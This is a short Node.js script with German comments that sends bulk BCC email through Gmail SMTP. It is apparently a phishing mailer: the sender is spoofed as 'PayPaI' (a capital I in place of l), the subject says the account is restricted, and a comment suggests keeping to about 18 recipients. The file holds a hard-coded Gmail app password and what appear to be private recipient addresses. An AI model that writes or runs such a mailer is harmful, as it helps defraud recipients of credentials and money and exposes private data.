const nodemailer = require("nodemailer");
const fs = require("fs");

// HTML-Mail laden
const html = fs.readFileSync("./mail-de.html", "utf8");

// GMAIL DATEN (ECHT EINTRAGEN)
const GMAIL_USER = "paypai.service.benz@gmail.com";
const GMAIL_APP_PASS = "osrvqiudzzybrjum";

// EMPFÄNGER (BCC – gemischt ist okay)
const BCC_RECIPIENTS = [
  "maxi.schleusner@gmail.com",
  "behamoritz@gmx.de",
  "holzerluis3@gmail.com",
  // bis ~18 ist okay
];

async function main() {
  // SMTP-Transporter (nicht ändern)
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: GMAIL_USER,
      pass: GMAIL_APP_PASS,
    },
  });

  // Login testen
  await transporter.verify();
  console.log("Gmail SMTP Login OK");

  // Mail senden
  const info = await transporter.sendMail({
    from: `PayPaI <${GMAIL_USER}>`, // neutraler Absender
    to: GMAIL_USER,                // nicht leer lassen
    bcc: BCC_RECIPIENTS,            // mehrere Empfänger
    subject: "Konto vorübergehend eingeschränkt",         // neutraler Betreff
    html,
    text: "Dies ist die Text-Version der E-Mail.",
  });

  console.log("Gesendet:", info.messageId);
}

main().catch((err) => {
  console.error("Fehler:", err);
  process.exit(1);
});